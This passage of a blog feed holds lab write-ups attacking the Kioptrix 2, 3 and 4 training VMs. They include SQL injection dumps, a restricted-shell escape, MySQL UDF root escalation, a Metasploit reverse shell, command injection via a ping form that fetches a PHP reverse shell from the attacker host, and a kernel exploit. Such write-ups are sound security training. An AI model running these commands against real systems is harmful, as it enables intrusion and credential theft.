|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|</em>  System time: 2014-06-22T18:36:57-04:00
| smb-security-mode:
|   Account that was used for smb scripts: guest
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|<em>  Message signing disabled (dangerous, but default)
|</em>smbv2-enabled: Server doesn&rsquo;t support SMBv2 protocol
```</p>

<p>Again, this seems to be a web based challenge. Navigating to the target website shows this:</p>

<p><img class="center" src="/images/kio4.png" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Supplying a single quote in the password field gives an error, which nicely discloses the database end as being MySQL:</p>

<p><em>Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
Wrong Username or Password</em></p>

<p>Sqlmap to the rescue!</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://192.168.127.129/checklogin.php">http://192.168.127.129/checklogin.php</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;data=&ldquo;myusername=admin&amp;mypassword=test&rdquo; &mdash;dump</p>

<p>Database: members
Table: members
[2 entries]
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| id | username | password              |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>Logging in with these credentials didn&rsquo;t yield anything though, all I could see was a member&rsquo;s control panel with no functionality. So I remembered the previous challenge that allowed SSH access, and tried to log in:</p>

<p><code>plain
root@kali:~# ssh john@192.168.127.129
The authenticity of host '192.168.127.129 (192.168.127.129)' can't be established.
RSA key fingerprint is 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.127.129' (RSA) to the list of known hosts.
john@192.168.127.129's password:
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$
</code></p>

<p>Excellent! It&rsquo;s time for some sniffing around. This is not a normal shell, usual commands don&rsquo;t work, so let&rsquo;s see what&rsquo;s available with the help system.</p>

<p><code>plain
john:~$ help
cd  clear  echo  exit  help  ll  lpath  ls
</code></p>

<p>Hmm, not much. Actions are restricted too, can&rsquo;t <em>cd</em> to wherever I want:</p>

<p><code>plain
john:~$ cd /
*** forbidden path -&gt; "/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
</code></p>

<p>So I googled for a bit, and it appears this shell is a Python based limited shell (<a href="https://github.com/ghantoos/lshell">https://github.com/ghantoos/lshell</a>):</p>

<blockquote><p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/
disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p></blockquote>

<p>It is possible to escape from this shell by leveraging the <em>echo</em> command to call <em>os.system</em> in order to spawn a shell: <code>echo os.system(&lsquo;/bin/bash&rsquo;)</code></p>

<p><code>plain
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
</code></p>

<p>Poking around, I found the following information in <code>/var/www/john/john.php</code>:</p>

<p><code>plain
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
</code></p>

<p>So, root doesn&rsquo;t have a password for MySQL? Let&rsquo;s check:</p>

<p>``` plain
john@Kioptrix4:/var/www/john$ mysql -u root -h localhost
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the buffer.
```</p>

<p><a href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">Here</a> I have found a way to get root privileges from a MySQL server running as root. Here&rsquo;s a quick summary:</p>

<ul>
<li><p>It is possible to escalate from MySQL server root level to system root by using User Defined Functions (UDF)</p></li>
<li><p>We need the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys.so</a> library that contains some useful functions that can interact with the OS. The most important ones are <strong>sys_exec</strong> (executes the command and returns the exit status) and <strong>sys_eval</strong> (executes the command and returns the standard output)</p></li>
</ul>


<p>The next step would be to find a way to get the library on the machine with our MySQL server. But that&rsquo;s not necessary in this case, because it&rsquo;s already on the server!</p>

<p><code>plain
john@Kioptrix4:~$ whereis lib_mysqludf_sys.so
lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
</code></p>

<p>It took a bit of googling and trial and error until I found a way that worked in getting me to a root shell. <a href="http://superuser.com/questions/400723/how-do-i-create-a-superuser-from-the-command-line-in-ubuntu">Here</a> is a useful post. The relevant part for us is this:</p>

<blockquote><p>Until Ubuntu 11.10, the Unix group for administrators with root privileges through sudo had been admin. Starting with Ubuntu
12.04  LTS, it is now sudo, for compatibility with Debian and sudo itself. However, for backwards compatibility, admin group
members are still recognized as administrators</p></blockquote>

<p>So it is possible to make the john account to be part of the admin group, that is equivalent to the sudo group. So from the MySQL prompt, run this:</p>

<p><code>sql
SELECT sys_exec('usermod -a -G admin');
</code></p>

<p>What that does is it modifies john&rsquo;s account, appending it to the admin group. So let&rsquo;s do it on the MySQL command line:</p>

<p><code>sql
mysql&gt; select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 |
+--------------------------------------+
1 row in set (0.11 sec)
</code></p>

<p>Now from john&rsquo;s shell:</p>

<p><code>plain
john@Kioptrix4:~$ sudo su
[sudo] password for john:
root@Kioptrix4:/home/john# whoami
root
</code></p>

<p>Awesome! We finally got root access! In root&rsquo;s directory there is another </code>congrats.txt</code> file that tells us there are at least 2 different tested ways to get root on this system. It sure was an interesting machine, and my favorite in the series, because it wasn&rsquo;t as straightforward as the others, and I had to look for more information and try (and fail) different approaches before I hit upon the winning one.</p>

<p>Here&rsquo;s today&rsquo;s fortune cookie:</p>

<blockquote><p>You single-handedly fought your way into this hopeless mess.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 3]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3/"/>
    <updated>2014-06-20T23:53:34+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3</id>
    <content type="html"><![CDATA[<p>Next in the Kioptrix series is level 3.</p>

<p><strong>Important</strong></p>

<p>With the VM there is a README.txt file that says you should update your hosts file with the VM&rsquo;s IP and hostname, which is <em>kioptrix3.com</em>. I initially ignored it and on the gallery page, all I could see were some broken images and links that didn&rsquo;t work. I went back and added the entry to my <code>/etc/hosts</code> file, and everything worked fine afterwards.</p>

<!-- more -->


<p>Start by checking out what&rsquo;s being exposed with Nmap:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.128</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-20 23:56 EEST
Nmap scan report for 192.168.127.128
Host is up (0.00039s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|<em>  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Ligoat Security &ndash; Got Goat? Security &hellip;
MAC Address: 00:0C:29:07:4F:A9 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>Let&rsquo;s take a look at what&rsquo;s hosted on the web server. It appears to be a site with a blog page, a gallery and what appears to be an admin login page:</p>

<p><img class="center" src="/images/lotus_cms.png" title="&lsquo;admin login&rsquo; &lsquo;login&rsquo;" ></p>

<p>I tried running a sqlmap scan against it, with no success. Next, I thought maybe there might be something about the LotusCMS that powers up the site. It turns out there&rsquo;s a remote execution exploit available in Metasploit:</p>

<p><strong>LotusCMS 3.0 eval() Remote Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability found in Lotus CMS 3.0&rsquo;s Router() function. This is done by embedding PHP code in the &lsquo;page&rsquo; parameter,
which will be passed to a eval call, therefore allowing remote code execution. The module can either automatically pick up a &lsquo;page&rsquo; parameter
from the default page, or manually specify one in the URI option. To use the automatic method, please supply the URI with just a directory path,
for example: &ldquo;/lcms/&rdquo;. To manually configure one, you may do: &ldquo;/lcms/somepath/index.php?page=index&rdquo;</p></blockquote>

<p>``` plain
msf > use exploit/multi/http/lcms_php_exec
msf exploit(lcms_php_exec) > show options</p>

<p>Module options (exploit/multi/http/lcms_php_exec):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   Proxies                   no        Use a proxy chain
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic LotusCMS 3.0</p>

<p>msf exploit(lcms_php_exec) > set RHOST 192.168.127.128
RHOST => 192.168.127.128
msf exploit(lcms_php_exec) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf exploit(lcms_php_exec) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(lcms_php_exec) > set URI /
URI => /
msf exploit(lcms_php_exec) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:4444
[</em>] Using found page param: /index.php?page=index
[<em>] Sending exploit &hellip;
[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.128:40623) at 2014-06-22 00:37:23 +0300
whoami</p>

<p>www-data
```</p>

<p>So we have a shell. I could not find a local privilege escalation exploit right away, so I instead started exploring the system.</p>

<p><code>plain
pwd
/home/www/kioptrix3.com
ls -l
total 84
drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
drwxrwxrwx  8 root root  4096 Apr 14  2011 core
drwxrwxrwx  8 root root  4096 Apr 14  2011 data
-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico
drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
-rw-r--r--  1 root root   399 Feb 23  2011 index.php
drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
drwxrwxrwx  3 root root  4096 Apr 14  2011 style
-rw-r--r--  1 root root   243 Aug  5  2010 update.php
</code></p>

<p>The gallery directory looks interesting, so I looked inside:</p>

<p><code>plain
cd gallery
ls -l
total 156
drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK
-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql
-rw-r--r-- 1 root root   252 Apr 12  2011 g.php
drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin
-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php
-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php
-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php
-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php
-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php
-rw-r--r-- 1 root root   249 Apr 12  2011 index.php
-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK
-rw-r--r-- 1 root root   212 Apr 12  2011 login.php
-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php
-rw-r--r-- 1 root root   249 Apr 12  2011 p.php
drwxrwxrwx 2 root root  4096 Apr 12  2011 photos
-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php
-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php
-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php
-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html
-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php
-rw-r--r-- 1 root root   215 Apr 12  2011 register.php
drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin
-rw-r--r-- 1 root root   213 Apr 12  2011 search.php
-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php
-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php
drwxr-xr-x 6 root root  4096 Apr 12  2011 themes
-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt
-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php
</code></p>

<p>So, there&rsquo;s all the source code for the gallery. I checked the files that looked interesting until I came upon a hit on the <code>gconfig.php</code> file, which contains the sort of information we need:</p>

<p>``` plain
/*</p>

<pre><code>A sample Gallarific configuration file. You should edit
the installer details below and save this file as gconfig.php
Do not modify anything else if you don't know what it is.
</code></pre>

<p>*/</p>

<pre><code>$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
</code></pre>

<p>```</p>

<p>I tried SSHing to the box with these credentials and also elevating privileges with su, but that would have been too easy. So more digging in the Php source code. The <code>gfunctions.php</code> file contains a plethora of information, among which there are some table and column names. There might be more information in the Php files but I didn&rsquo;t have the patience to go through all of them.</p>

<p>Back at the gallery, we can see some sorting options:</p>

<p><img class="center" src="/images/sort.png" title="&lsquo;sort options&rsquo; &lsquo;sort&rsquo;" ></p>

<p>Changing the sort filter to <em>photo id</em> makes the URL look like this:</p>

<p><code><a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a></code></p>

<p>And if I replace the <code>id=1</code> part with <code>id=&lsquo;</code>, the site spits back a SQL error:</p>

<p><em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;&rsquo; order by parentid,sort,name' at line 1Could not select category</em></p>

<p>Now that I know SQLi is possible, it&rsquo;s time to fire sqlmap again!</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;dump</p>

<p>Database: gallery
Table: dev_accounts
[2 entries]
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| id | username   | password                         |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>```</p>

<p>It was a bit overkill to dump so much information, but I only show here the important bits. To crack the hashes, I used the <a href="http://www.hashkiller.co.uk/">http://www.hashkiller.co.uk/</a> site:</p>

<p>dreg&rsquo;s password: Mast3r</p>

<p>loneferret&rsquo;s password: starwars</p>

<p>Thankfully, these credentials work for SSH login, so I could get rid of the Metasploit shell which kept throwing EOF errors if I didn&rsquo;t interact with it for a while.</p>

<p>``` plain
ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#108;&#111;&#110;&#x65;&#x66;&#x65;&#x72;&#x72;&#101;&#116;&#x40;&#107;&#105;&#111;&#112;&#x74;&#114;&#x69;&#x78;&#51;&#46;&#99;&#111;&#x6d;">&#x6c;&#111;&#110;&#101;&#x66;&#x65;&#x72;&#114;&#101;&#116;&#x40;&#x6b;&#x69;&#x6f;&#112;&#x74;&#x72;&#x69;&#x78;&#x33;&#x2e;&#x63;&#111;&#x6d;</a>
The authenticity of host &lsquo;kioptrix3.com (192.168.127.128)&rsquo; can&rsquo;t be established.
RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;kioptrix3.com&rsquo; (RSA) to the list of known hosts.
<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#108;&#111;&#110;&#x65;&#x66;&#x65;&#114;&#x72;&#x65;&#116;&#x40;&#107;&#x69;&#111;&#x70;&#116;&#x72;&#105;&#x78;&#51;&#46;&#99;&#111;&#x6d;">&#108;&#x6f;&#x6e;&#x65;&#x66;&#101;&#114;&#x72;&#101;&#116;&#64;&#107;&#105;&#x6f;&#x70;&#x74;&#x72;&#105;&#120;&#x33;&#46;&#x63;&#x6f;&#x6d;</a>&rsquo;s password:
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</p>

<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>To access official Ubuntu documentation, please visit:
<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$
```</p>

<p>In the home directory there&rsquo;s a <code>CompanyPolicy.README</code> file with the following:</p>

<p>``` plain
 Hello new employee,
 It is company policy here to use our newly installed software for editing, creating and viewing files.
 Please use the command &lsquo;sudo ht&rsquo;.
 Failure to do so will result in you immediate termination.</p>

<p> DG
 CEO
```</p>

<p>So, let&rsquo;s see what this ht program is all about:</p>

<p><code>plain
loneferret@Kioptrix3:~$ whereis ht
ht: /usr/local/bin/ht
loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht
</code></p>

<p>Looks like a SUID binary! And it seems it&rsquo;s a hex editor that we can use to view and edit any file on the system!</p>

<p><img class="center" src="/images/ht.png" title="&lsquo;ht&rsquo; &lsquo;ht&rsquo;" ></p>

<p>Ok, I could crack the root password, but there&rsquo;s an easier way, by modifing the <code>/etc/sudoers</code> file. First, I had to look up some information about the ht editor. You need to use the F (function) keys for this one. With F6, I could change the mode to text, making it look less horrible. The easiest way I found to go about it was to open the <code>/etc/sudoers</code> file again, after selecting the text mode. Then I added <em>/bin/bas</em> to loneferret&rsquo;s entry:</p>

<p><img class="center" src="/images/sudo_bash.png" title="&lsquo;sudo bash&rsquo; &lsquo;sudo bash&rsquo;" ></p>

<p>Now save the file and type <em>sudo bash</em> to get the long waited for root shell. In the /root/ directory there&rsquo;s also a <code>Congrats.txt</code> file:</p>

<p>``` plain
root@Kioptrix3:/root# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn&rsquo;t that bad now was it.</p>

<p>Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.</p>

<p>The object is to learn, do some research and have a little (legal)
fun in the process.</p>

<p>I hope you enjoyed this third challenge.</p>

<p>Steven McElrea
aka loneferret
<a href="http://www.kioptrix.com">http://www.kioptrix.com</a></p>

<p>Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.</p>

<p>Main page CMS:
<a href="http://www.lotuscms.org">http://www.lotuscms.org</a></p>

<p>Gallery application:
Gallarific 2.1 &ndash; Free Version released October 10, 2009
<a href="http://www.gallarific.com">http://www.gallarific.com</a>
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
<a href="http://www.exploit-db.com/exploits/15891/">http://www.exploit-db.com/exploits/15891/</a></p>

<p>The HT Editor can be found here:
<a href="http://hte.sourceforge.net/downloads.html">http://hte.sourceforge.net/downloads.html</a>
And the vulnerable version on Exploit-DB here:
<a href="http://www.exploit-db.com/exploits/17083/">http://www.exploit-db.com/exploits/17083/</a></p>

<p>Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```</p>

<p>And this was Kioptrix level 3, with another interesting twist.</p>

<blockquote><p>Today is the tomorrow you worried about yesterday.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2/"/>
    <updated>2014-06-16T22:47:31+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2</id>
    <content type="html"><![CDATA[<p>Today I will walk through exploiting level 2 in the Kioptrix series.</p>

<!-- more -->


<p>Again, I first did a ping sweep with Nmap and determined the IP of the target is 192.168.127.162</p>

<p>Next, the port scan:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.162</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-16 22:52 EEST
Nmap scan report for 192.168.127.162
Host is up (0.00036s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|<em>ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|</em>sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|<em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|</em>http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            630/udp  status
|<em>  100024  1            633/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|<em>http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=&mdash;
| Not valid before: 2009-10-07T23:10:47+00:00
|</em>Not valid after:  2010-10-07T23:10:47+00:00
|<em>ssl-date: 2014-06-16T16:42:47+00:00; -3h09m46s from local time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|</em>    SSL2_RC4_128_EXPORT40_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: Potentially risky methods: PUT
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|</em>http-title: 403 Forbidden
633/tcp  open  status   1 (RPC #100024)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            630/udp  status
|_  100024  1            633/tcp  status
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:20:9D:3E (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.30
```</p>

<h3>From web to shell</h3>

<p>Pointing the browser to the target, we can see this remote admin login panel:</p>

<p><img class="center" src="/images/login.png" title="&lsquo;admin login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Immediately thinking SQL injection, I did a quick scan with Owasp Zap and indeed, the login can be bypassed using an injection like the following:</p>

<p><code>&lsquo; or '1&rsquo; = &lsquo;1&rsquo; &mdash; </code></p>

<p>Now we can see an interface where we can ping hosts, which might mean remote code execution:</p>

<p><img class="center" src="/images/ping.png" title="&lsquo;ping ip&rsquo; &lsquo;ping&rsquo;" ></p>

<p>After testing the ping functionality, I ran a quick <em>uname -a</em> to confirm that remote code execution is possible:</p>

<p>``` plain
; uname -a</p>

<p>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
```</p>

<p>The semicolon is used to run multiple commands, so in this case I am closing the ping command and inputting another one after it. I tried poking around, checking if I can read /etc/shadow (which I can&rsquo;t, only /etc/passwd). The commands are ran by the <strong>apache</strong> user. So I&rsquo;m thinking, it&rsquo;s time for some PHP backdoor fun! I found some on Kali in <code>/usr/share/webshells/php</code></p>

<p>First, I&rsquo;m going to copy the reverse PHP shell to my home directory and rename it:</p>

<p><code>plain
cp php-reverse-shell.php ~/shell.php
</code></p>

<p>Let&rsquo;s see the description:</p>

<blockquote><p>This script will make an outbound TCP connection to a hardcoded IP and port.
The recipient will be given a shell running as the current user (apache normally).</p></blockquote>

<p>Next I looked at the Php code, and I need to change the IP and port. The IP is the address of the attacker machine, and for the port I just threw 80 in there, since an outbound connection to port 80 is guaranteed to be allowed (if there was a firewall in place).</p>

<p>With that done, the next step is to serve the shell on my machine and use the web interface to download it to the target host.</p>

<p>On my machine:</p>

<p><code>plain
nc -v -l -p 80 &lt; shell.php
</code></p>

<p>On the web interface:</p>

<p>``` plain
; wget 192.168.127.159:80 -O /tmp/puppies.php</p>

<p>; ls /tmp</p>

<p>puppies.php
```</p>

<p>Now listen on my machine for the incoming connection:</p>

<p><code>plain
nc -v -l -p 80
</code></p>

<p>And on the web interface, execute the shell:</p>

<p><code>plain
; php /tmp/puppies.php
</code></p>

<p>And we have a shell!</p>

<p><code>plain
nc: connect to 192.168.127.159 80 from 192.168.127.162 (192.168.127.162) 32772 [32772]
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
 13:15:37 up  2:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
</code></p>

<p>It&rsquo;s time for privilege escalation! I will use the sendpage exploit:</p>

<p><code>plain
cp /usr/share/exploitdb/platforms/linux/local/9545.c ~/sendpage.c
nc -vv -l -p 5555 &lt; sendpage.c
</code></p>

<p>And from the shell:</p>

<p><code>plain
sh-3.00# wget 192.168.127.159 -O /tmp/sendpage.c
sh-3.00# cd /tmp
sh-3.00# gcc -o sendpage sendpage.c
sh-3.00# chmod a+x sendpage
sh-3.00# ./sendpage
sh: no job control in this shell
sh-3.00# whoami
root
</code></p>

<h3>Breaking into the database</h3>

<p>I will now explore a different attack vector, by using <strong>sqlmap</strong> to dump the juicy stuff of the database.</p>

<p><code>plain
sqlmap -u "http://192.168.127.162/index.php" --dbms=MySQL --dump --data "uname=test&amp;psw=pass" --level=5 --risk=3
Database: webapp
Table: users
[2 entries]
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
| 1  | admin    | 5afac8d85f |
| 2  | john     | 66lajGGbla |
+----+----------+------------+
</code></p>

<p>I couldn&rsquo;t connect to the MySQL database though, so didn&rsquo;t find a use for these credentials.</p>

<p>I also tried an exploit against the CUPS daemon, to no avail. So I guess this is it for level 2.</p>

<blockquote><p>You have an unusual magnetic personality.  Don&rsquo;t walk too close to
metal objects which are not fastened down.</p></blockquote>
]]></content>
  </entry>
  
</feed>
